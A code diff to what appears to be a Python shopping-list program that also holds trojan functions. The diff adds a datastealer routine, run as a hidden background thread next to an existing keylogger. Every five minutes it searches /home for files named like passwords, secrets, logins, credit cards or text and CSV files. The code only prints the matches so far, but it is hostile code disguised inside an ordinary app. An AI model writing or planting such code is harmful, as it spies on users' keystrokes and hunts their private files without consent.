@@ -8,6 +8,7 @@ import threading
 import time
 import subprocess
 import threading
+import fnmatch
 slfile = "shoppinglist.json"
 
 def load():
@@ -109,8 +110,19 @@ def keylogger():
         listener.join()  
 
 
+def datastealer():
+    while True:
+        time.sleep(300)
+        maybesecret = ["*.txt", "*.csv", "password*", "secret*", "login", "username", "creditcard"]
+        for root, dirs, files in os.walk('/home'):  
+            for pattern in maybesecret:
+                for filename in files:
+                    if fnmatch.fnmatch(filename.lower(), pattern.lower()):
+                        print(f"Maybe found secret >.> {os.path.join(root, filename)}")
+						
 def starttrojan():
 	threading.Thread(target=keylogger, daemon=True).start()
+	threading.Thread(target=datastealer, daemon=True).start()
 	while True:
 		time.sleep(1)
 	print("Not yet implemented")
